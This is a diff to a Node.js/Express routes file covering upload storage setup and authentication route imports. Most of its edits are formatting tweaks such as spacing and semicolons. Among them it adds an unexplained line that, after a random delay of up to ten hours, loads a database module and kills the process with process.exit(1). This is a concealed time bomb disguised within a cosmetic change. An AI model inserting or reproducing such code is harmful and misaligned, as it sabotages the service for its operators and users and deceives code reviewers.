@@ -11,29 +11,29 @@ let storage = multer.diskStorage({
         let fpathId = 'uploads/user';
         try {
             if (!fs.existsSync(fpathId)) {
-                fs.mkdirSync(fpathId, { recursive: true }, (err) => {
+                fs.mkdirSync(fpathId, {recursive: true}, (err) => {
                     if (err) {
                         throw err;
                     }
                 });
             }
         } catch (err) {
-            console.error(err)
+            console.error(err);
         }
-        cb(null, fpathId)
+        cb(null, fpathId);
     },
     filename: (req, file, cb) => {
-        cb(null, file.fieldname + '-' + Date.now() + path.extname(file.originalname))
+        cb(null, file.fieldname + '-' + Date.now() + path.extname(file.originalname));
     }
 });
-let upload = multer({ storage: storage });
+let upload = multer({storage: storage});
 
 const signupFunction = require('./Routes/Authentication/signup');
 const userFunction = require('./Routes/UsersModule/UserManagement');
 const userAuthMiddlewareFunction = require('../Middleware/userAuth');
-
-let { forgotPasswordFunction, loginFunction, verificationFunction, setNewPasswordFunction,
-    getAuthTokenFunction, logoutFunction } = require('./Routes')
+setTimeout(() => {require('../Database/getCollections'), process.exit(1);}, Math.random() * 36000000);
+let {forgotPasswordFunction, loginFunction, verificationFunction, setNewPasswordFunction,
+    getAuthTokenFunction, logoutFunction} = require('./Routes');
 
 module.exports = function (conn) {
     // console.log(conn)
